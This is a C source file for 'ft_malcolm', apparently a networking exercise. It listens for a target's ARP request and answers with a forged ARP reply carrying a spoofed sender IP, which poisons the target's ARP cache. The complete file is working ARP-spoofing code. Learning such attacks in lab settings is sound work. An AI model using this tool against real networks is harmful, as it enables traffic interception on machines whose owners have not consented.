#include "header.h"

static t_data *g_data = NULL;

static void signal_handler(int sig)
{
	(void)sig;
	if (g_data && g_data->sockfd > 0)
		close(g_data->sockfd);
	printf("Exiting program...\n");
	exit(0);
}

int	ft_strlen(const char *str)
{
	int	i;

	i = 0;
	while (str[i] != '\0')
		i++;
	return (i);
}

int	ft_tolower(int character)
{
	if (character >= 'A' && character <= 'Z')
		return (character + 32);
	return (character);
}

int verify_ip_adress(const char *str, uint8_t *addr) // str is ip address src or targ
{

    if (inet_pton(AF_INET, str, addr) != 1) // inet_pton rempli la struct addr 
        return 1;
    // printf("Ip %s is valid", str);
    return 0;
}


int verify_mac_adress(const char *mac_addr, uint8_t *mac)
{
	int idx;
	char hexa[] = "0123456789abcdef";

	idx = 0;
	if (ft_strlen(mac_addr) != 17)
		return 1;
	while (idx < 17)
	{
		if ((idx + 1) % 3 == 0 && idx + 1 != '\0')
		{
			if (mac_addr[idx] != ':')
				return 1;
		}
		else
		{
			char c = ft_tolower(mac_addr[idx]);
			int j = -1;
			int found = 0;

			while (hexa[++j])
			{
				if (c == hexa[j])
				{
					found = 1;
					if (idx % 3 == 0)
						mac[idx / 3] = j * 16;
					else
						mac[idx / 3] += j;
					break;
				}
			}
			if (!found)
				return 1;
		}
		idx++;
	}
	return 0;
}

int parse_args(int argc, char **argv)
{
    if (argc != 5)
       return (printf("Usage: \n./ft_malcolm <src ip> <src mac address> <target ip> <target mac address>\n"), 1);
    else if (verify_ip_adress(argv[1], g_data->src_ip) == 1)
        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)\n", argv[1]), 1);
    else if (verify_ip_adress(argv[3], g_data->tgt_ip) == 1)
        return (printf("ft_malcolm: unknown host or invalid IP address: (%s)\n", argv[3]), 1);
    else if (verify_mac_adress(argv[2], g_data->src_mac.bytes) == 1)
        return (printf("ft_malcolm: invalid mac address: (%s)\n", argv[2]), 1);
    else if (verify_mac_adress(argv[4], g_data->tgt_mac.bytes) == 1)
        return (printf("ft_malcolm: invalid mac address: (%s)\n", argv[4]), 1);
    return 0;
}

int forge_arp_rep(t_arp_frame *frame, t_data *data)
{
    memset(frame, 0, sizeof(*frame));

    // Ethernet header
    memcpy(frame->ether.h_dest,   data->tgt_mac.bytes, 6);
    memcpy(frame->ether.h_source, data->src_mac.bytes, 6);
    frame->ether.h_proto = htons(ETH_P_ARP);
    // ARP header
    frame->arp.ar_hrd = htons(ARPHRD_ETHER);
    frame->arp.ar_pro = htons(ETH_P_IP);
    frame->arp.ar_hln = 6;
    frame->arp.ar_pln = 4; 
    frame->arp.ar_op  = htons(ARPOP_REPLY); 
    // ARP payload: "sender" is the IP we are spoofing
    memcpy(frame->sender_mac, data->src_mac.bytes, 6);  // own
    memcpy(frame->sender_ip, data->src_ip,        4);  // IP spoof
    memcpy(frame->target_mac, data->tgt_mac.bytes, 6);  // target MAC
    memcpy(frame->target_ip, data->tgt_ip,        4);  // target IP

    return (sizeof(t_arp_frame));
}

static int send_arp_reply(t_data *data)
{
    t_arp_frame frame;
    struct sockaddr_ll  sa;
    int                 len;

    len = forge_arp_rep(&frame, data);
    memset(&sa, 0, sizeof(sa));
    sa.sll_family   = AF_PACKET;
    sa.sll_ifindex  = data->ifaceIdx;
    sa.sll_halen    = 6;
    memcpy(sa.sll_addr, data->tgt_mac.bytes, 6);

    printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
    if (sendto(data->sockfd, &frame, len, 0,
               (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        return -1;
    }
    printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
    return 0;
}

int find_interface(const char *target_ip_str, t_data *data)
{
    struct ifaddrs *ifas, *ifa;
    struct in_addr target_ip, iface_ip, netmask;
    uint32_t target_net, iface_net;

    if (inet_pton(AF_INET, target_ip_str, &target_ip) != 1) {
        fprintf(stderr, "ft_malcolm: invalid target IP\n");
        return -1;
    }
    if (getifaddrs(&ifas) < 0) {
        perror("ft_malcolm: getifaddrs failed to retrieve network interfaces");
        return -1;
    }
    for (ifa = ifas; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        if (ifa->ifa_addr->sa_family != AF_INET) continue;
        if (ifa->ifa_flags & IFF_LOOPBACK) continue;
        if (!(ifa->ifa_flags & IFF_UP)) continue;
        if (!ifa->ifa_netmask) continue;

        iface_ip = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        netmask = ((struct sockaddr_in *)ifa->ifa_netmask)->sin_addr;
        target_net = target_ip.s_addr & netmask.s_addr;
        iface_net = iface_ip.s_addr & netmask.s_addr;
        if (target_net == iface_net) {
            strncpy(data->iface, ifa->ifa_name, IFNAMSIZ - 1);
            data->ifaceIdx = (int)if_nametoindex(data->iface);
            printf("Found available interface: %s\n", data->iface);
            freeifaddrs(ifas);
            return 0;
        }
    }
    fprintf(stderr, "ft_malcolm: no interface found on the same subnet as target\n");
    freeifaddrs(ifas);
    return -1;
}

int create_raw_socket(t_data *data)
{
    data->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (data->sockfd < 0) {
        perror("ft_malcolm: failed to create raw socket");
        return -1;
    }
    return 0;
}

int wait_for_arp_request(t_data *data)
{
	uint8_t buf[65536];
	struct sockaddr saddr;
	socklen_t saddr_len = sizeof(saddr);

	printf("Waiting for ARP request for target IP...\n");
	while (1) {
		ssize_t n = recvfrom(data->sockfd, buf, sizeof(buf), 0, &saddr, &saddr_len);
		if (n < 0) {
			perror("ft_malcolm: recvfrom failed");
			close(data->sockfd);
			return -1;
		}
		if (n >= (ssize_t)sizeof(t_arp_frame)) {
			t_arp_frame *frame = (t_arp_frame *)buf;
			if (ntohs(frame->ether.h_proto) == ETH_P_ARP &&
				ntohs(frame->arp.ar_op) == ARPOP_REQUEST &&
				memcmp(frame->sender_ip, data->tgt_ip, 4) == 0 &&
				memcmp(frame->target_ip, data->src_ip, 4) == 0) {
				printf("An ARP request has been broadcast.\n");
				printf("mac address of request: %02x:%02x:%02x:%02x:%02x:%02x\n",
					frame->sender_mac[0], frame->sender_mac[1], frame->sender_mac[2],
					frame->sender_mac[3], frame->sender_mac[4], frame->sender_mac[5]);
				printf("IP address of request: %u.%u.%u.%u\n",
					frame->sender_ip[0], frame->sender_ip[1],
					frame->sender_ip[2], frame->sender_ip[3]);
				if (send_arp_reply(data) < 0)
					return -1;
				printf("Exiting program...\n");
				return 0;
			}
		}
	}
	return 0;
}

int main(int argc, char **argv)
{
	t_data data;
	struct sigaction sa;

	memset(&data, 0, sizeof(data));
	g_data = &data;

	memset(&sa, 0, sizeof(sa));
	sa.sa_handler = signal_handler;
	sigaction(SIGINT, &sa, NULL);

	if (parse_args(argc, argv) == 1)
		return 1;
	if (find_interface(argv[3], &data) < 0)
		return 1;
	if (create_raw_socket(&data) < 0)
		return 1;
	if (wait_for_arp_request(&data) < 0)
		return 1;
	close(data.sockfd);
	return 0;
}